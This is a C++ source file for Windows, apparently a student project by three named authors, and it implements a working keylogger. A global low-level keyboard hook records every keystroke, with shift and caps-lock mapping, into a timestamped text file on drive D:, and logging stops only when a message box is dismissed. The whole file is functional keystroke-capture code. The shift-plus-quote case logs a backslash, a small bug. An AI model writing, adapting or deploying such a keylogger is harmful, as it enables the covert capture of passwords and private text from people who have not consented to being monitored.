// 13513017 Miftahul Mahfuzh
// 13513027 Ahmad Rizdaputra
// 13513075 Bimo Aryo Tyasono

#define _WIN32_WINNT 0x0500
#include <fstream>
#include <windows.h>
#include <cstdio>
#include <ctime>
#include <iostream>
#include <cstring>

using namespace std;
string waktu(){// fungsi yang mengembalikan nama file sesuai dengan waktu
	time_t rawtime;
	struct tm * timeinfo;
	char buffer [80], date1 [80];
	string date;
	
	date+="D:\\";
	time(&rawtime);
	timeinfo = localtime (&rawtime);
	
	strftime(buffer,80,"%Y%m%d-%H%M%S",timeinfo);
	date+=buffer; date += ".txt";
	return date;
}	
	string date=waktu();
	char date1[80];
	
	
	ofstream out(strcpy(date1,date.c_str()),ios::out);
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
	static bool iscaps = false;
	// jika tombol keyboard ditekan
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {
			// Invisible keys
			case VK_CAPITAL:
				if(iscaps) iscaps = false;
				else iscaps = true;
				break;
			case VK_LCONTROL:	out << "<LCTRL>";		break;
			case VK_RCONTROL:	out << "<RCTRL>";		break;
			case VK_INSERT:		out << "<INSERT>";		break;
			case VK_END:		out << "<END>";			break;
			case VK_PRINT:		out << "<PRINT>";		break;
			case VK_DELETE:		out << "<DEL>";			break;
			case VK_BACK:		out << "<BK>";			break;
			case VK_LEFT:		out << "<LEFT>";		break;
			case VK_RIGHT:		out << "<RIGHT>";		break;
			case VK_UP:			out << "<UP>";			break;
			case VK_DOWN:		out << "<DOWN>";		break;
			case VK_OEM_2:		
				if (GetAsyncKeyState(VK_SHIFT)) out << "?";
                else 			out << "/";				break;
			case VK_OEM_3:
				if (GetAsyncKeyState(VK_SHIFT)) out << "~";
				else 			out << "`";				break;
			case VK_OEM_4:
				if(GetAsyncKeyState(VK_SHIFT)) out << "{";
				else			out << "[";				break;
			case VK_OEM_5:
				if(GetAsyncKeyState(VK_SHIFT)) out << "|";
				else			out << "\\";			break;
			case VK_OEM_6:
				if(GetAsyncKeyState(VK_SHIFT)) out << "}";
				else			out << "]";				break;
			case VK_OEM_7:
				if(GetAsyncKeyState(VK_SHIFT)) out << "\\";
				else			out << "'";				break;
			case VK_LSHIFT:
			case VK_RSHIFT:								break;
			case 0xBC:               
				if(GetAsyncKeyState(VK_SHIFT)) out << "<";
				else			out << ",";				break;
			case 0xBE:              
				if(GetAsyncKeyState(VK_SHIFT)) out << ">";
				else 			out << ".";				break;
			case 0xBA:              
				if(GetAsyncKeyState(VK_SHIFT)) out << ":";
				else			out << ";";				break;
			case 0xBD:              
				if(GetAsyncKeyState(VK_SHIFT)) out << "_";
				else			out << "-";				break;
			case 0xBB:              
				if(GetAsyncKeyState(VK_SHIFT)) out << "+";
				else			out << "=";				break;
			default:
				if(iscaps) out << char(toupper(p->vkCode));
				else if(GetAsyncKeyState(VK_SHIFT)){
					switch(char(tolower(p->vkCode))) {
						case '1' : out << '!';break;
						case '2' : out << '@';break;
						case '3' : out << '#';break;
						case '4' : out << '$';break;
						case '5' : out << '%';break;
						case '6' : out << '^';break;
						case '7' : out << '&';break;
						case '8' : out << '*';break;
						case '9' : out << '(';break;
						case '0' : out << ')';break;
						default : out << char(toupper(p->vkCode));					
					}
				}
				else out << char(tolower(p->vkCode));
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	string date=waktu();
	char date1[80];
	strcpy(date1,date.c_str());
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		keyboardHookProc,
		hInstance,
		0);
	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);
	out.close();
	return 0;
}